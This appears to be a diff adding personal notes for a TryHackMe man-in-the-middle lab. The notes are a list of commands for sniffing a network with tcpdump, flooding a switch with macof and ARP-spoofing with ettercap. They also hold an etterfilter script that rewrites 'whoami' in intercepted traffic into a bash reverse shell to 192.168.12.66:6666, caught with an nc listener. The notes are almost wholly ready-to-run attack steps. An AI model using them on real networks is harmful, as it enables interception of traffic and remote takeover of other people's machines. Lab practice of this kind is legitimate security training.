@@ -1,0 +1,47 @@
+### mitm ###
+https://tryhackme.com/room/layer2
+
+
+## discovery
+ip address show eth1								# check interface
+for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done	# host discovery
+cat /etc/hosts									# check hosts
+
+
+## passiv sniff
+tcpdump -i eth1									# sniff traffic
+tcpdump -A -i eth1								# verbose, output packet
+tcpdump -vvA -i eth1								# very verbose
+tcpdump -A -i eth1 -w /tmp/tcpdump.pcap						# output packet into pcap file
+tcpdump -A -i any								# listen on all interface
+tcpdump -A -i any port 80
+
+
+## MAC flooding (noisy)
+tcpdump -A -i eth1 -w /tmp/tcpdump2.pcap					# capture traffic
+macof -i eth1									# flood switch
+
+
+## ARP cache poisoning
+ettercap -T -i eth1 -M arp							# arp spoof attack
+q										# to stop attack
+
+
+## mitm tampering
+ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 6666 proto tcp	# enable rule in our firewall
+ufw disable									# or disable it
+
+nano whoami.ecf
+if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
+    log(DATA.data, "/tmp/ettercap.log");
+    replace("whoami", "/bin/bash -c \"bash -i >& /dev/tcp/192.168.12.66/6666 0>&1 2>&1\"" );
+    msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");
+}
+
+etterfilter whoami.ecf -o whoami.ef						# make filter
+nc -nvlp 6666									# wait shell
+ettercap -T -i eth1 -M arp -F whoami.ef						# poison with filter
+
+
+
+
